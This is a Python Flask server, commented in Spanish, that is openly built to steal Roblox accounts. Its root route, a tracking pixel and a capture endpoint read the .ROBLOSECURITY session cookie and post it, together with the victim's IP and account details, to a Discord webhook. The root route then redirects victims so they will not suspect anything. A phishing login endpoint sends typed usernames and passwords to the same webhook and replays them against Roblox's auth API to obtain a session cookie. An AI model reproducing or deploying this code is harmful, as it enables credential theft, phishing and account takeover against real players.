from flask import Flask, request, Response, redirect
import requests
import json
import os
import base64

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/TU_WEBHOOK_AQUI"

# Imagen pixel transparente
PIXEL = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")

def send_to_discord(cookie, ip, user_agent, roblox_user_data=None):
    """Envía la cookie real a Discord"""
    try:
        # Información del usuario de Roblox si está disponible
        user_info = ""
        if roblox_user_data:
            user_info = f"\nUsername: {roblox_user_data.get('name', 'Unknown')}\nID: {roblox_user_data.get('id', 'Unknown')}"
        
        message = f"**Cookie Robada**\nIP: {ip}\nUser-Agent: {user_agent}\nCookie: `{cookie}`{user_info}"
        
        payload = {
            "content": message
        }
        
        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        print(f"Cookie enviada a Discord: {response.status_code}")
        
    except Exception as e:
        print(f"Error: {e}")

def get_roblox_user_info(user_id):
    """Obtiene información del usuario por ID"""
    try:
        response = requests.get(f"https://users.roblox.com/v1/users/{user_id}")
        return response.json()
    except:
        return None

@app.route('/')
def index():
    # Capturar headers importantes
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Capturar la cookie real de Roblox
    real_cookie = request.cookies.get('.ROBLOSECURITY', None)
    
    if real_cookie:
        print(f"Cookie real capturada de IP: {ip}")
        
        # Intentar obtener información del usuario usando la cookie
        roblox_user_id = None
        try:
            # Hacer una solicitud autenticada a la API de Roblox
            auth_response = requests.get(
                "https://users.roblox.com/v1/users/authenticated",
                cookies={'.ROBLOSECURITY': real_cookie},
                timeout=10
            )
            if auth_response.status_code == 200:
                user_data = auth_response.json()
                roblox_user_id = user_data.get('id')
                roblox_user_data = get_roblox_user_info(roblox_user_id)
                send_to_discord(real_cookie, ip, user_agent, roblox_user_data)
            else:
                send_to_discord(real_cookie, ip, user_agent)
        except:
            send_to_discord(real_cookie, ip, user_agent)
        
        # Redirigir al perfil real de Roblox para que no sospechen
        return redirect('https://www.roblox.com/home', code=302)
    else:
        # Si no hay cookie, redirigir a Roblox (el usuario no está logueado)
        return redirect('https://www.roblox.com/login', code=302)

@app.route('/pixel.png')
def pixel():
    """Endpoint para tracking via img tag - captura cookie real también"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    real_cookie = request.cookies.get('.ROBLOSECURITY', None)
    
    if real_cookie:
        print(f"Cookie real capturada desde pixel en IP: {ip}")
        send_to_discord(real_cookie, ip, f"{user_agent} (via pixel)")
    
    return Response(PIXEL, mimetype='image/png')

@app.route('/api/capture', methods=['POST'])
def capture():
    """Endpoint para captura via JavaScript (aunque cookie es HttpOnly, el navegador la envía automáticamente)"""
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # La cookie viene en los headers, no en el body
        real_cookie = request.cookies.get('.ROBLOSECURITY', None)
        
        if real_cookie:
            print(f"Cookie real capturada desde API en IP: {ip}")
            send_to_discord(real_cookie, ip, f"{user_agent} (via API)")
        
        return {"status": "success"}
    except Exception as e:
        print(f"Error: {e}")
        return {"status": "error"}

@app.route('/api/login', methods=['POST'])
def login_capture():
    """Endpoint para capturar credenciales de login (phishing)"""
    try:
        data = request.json
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        username = data.get('username', '')
        password = data.get('password', '')
        
        # Enviar credenciales a Discord
        message = f"**Credenciales Robadas**\nIP: {ip}\nUsername: {username}\nPassword: {password}"
        payload = {"content": message}
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
        
        # Intentar login real para obtener la cookie
        session = requests.Session()
        login_response = session.post(
            "https://auth.roblox.com/v2/login",
            json={
                "ctype": "Username",
                "cvalue": username,
                "password": password
            },
            headers={
                "X-CSRF-TOKEN": "1",
                "Referer": "https://www.roblox.com/"
            }
        )
        
        # Capturar la cookie del response
        for cookie in session.cookies:
            if cookie.name == '.ROBLOSECURITY':
                print(f"Cookie obtenida via login: {cookie.value}")
                send_to_discord(cookie.value, ip, f"{request.headers.get('User-Agent')} (via login)")
                break
        
        return {"status": "success", "message": "Logged in successfully"}
    except Exception as e:
        print(f"Error: {e}")
        return {"status": "error"}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, ssl_context='adhoc')  # HTTPS es necesario
